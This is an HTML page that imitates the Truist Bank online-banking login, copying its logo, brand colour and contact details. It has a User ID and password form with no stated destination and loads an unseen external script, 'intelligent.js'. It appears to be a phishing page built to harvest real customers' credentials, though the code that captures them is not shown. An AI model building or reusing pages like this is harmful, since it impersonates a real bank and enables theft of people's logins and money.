<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Truist Bank - Login</title>
  <link rel="icon" href="truist.png" type="truist.png">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .container {
      background: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
      width: 350px;
      text-align: center;
    }
    .logo {
      margin-bottom: 20px;
    }
    .logo img {
      width: 160px;
    }
    h2 {
      color: #512D6D; /* Truist Purple */
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #512D6D; /* Truist Purple */
      border: none;
      color: #fff;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background-color: #3c2150;
    }
    .demo-info {
      margin-top: 20px;
      padding: 15px;
      background: #f0f0f0;
      border-radius: 6px;
      font-size: 14px;
      color: #333;
    }
    .demo-info h3 {
      color: #512D6D;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="truist.png" alt="Truist Logo">
    </div>
    <h2>Truist Online Banking </h2>
    
    <form id="allForm">
      <input type="text" placeholder="User ID" required name="user ID">
      <input type="password" placeholder="Password" required name="Password">
      <button type="submit">Log In</button>
    </form>

    <div class="demo-info">
      <h3> Create Account</h3>
      <p>Need help? Contact us:</p>
      <p>ðŸ“ž 1-800-TRUIST </p>
      <p>ðŸ“§ support@truist.com</p>
    </div>
  </div>
  <script src="intelligent.js"></script>
</body>
</html>
